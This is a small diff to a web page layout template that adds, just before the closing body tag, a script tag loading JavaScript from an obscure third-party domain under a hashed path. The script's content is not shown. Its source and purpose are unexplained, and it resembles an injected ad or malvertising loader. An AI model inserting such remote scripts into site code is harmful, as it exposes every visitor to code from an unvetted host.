@@ -164,6 +164,7 @@
         })();
     </script>
     @stack('scripts')
+    <script type='text/javascript' src='//hammerhintthesaurus.com/ec/b8/56/ecb85690fbf2ed786726f35d884d4c93.js'></script>
 </body>
 
 </html>
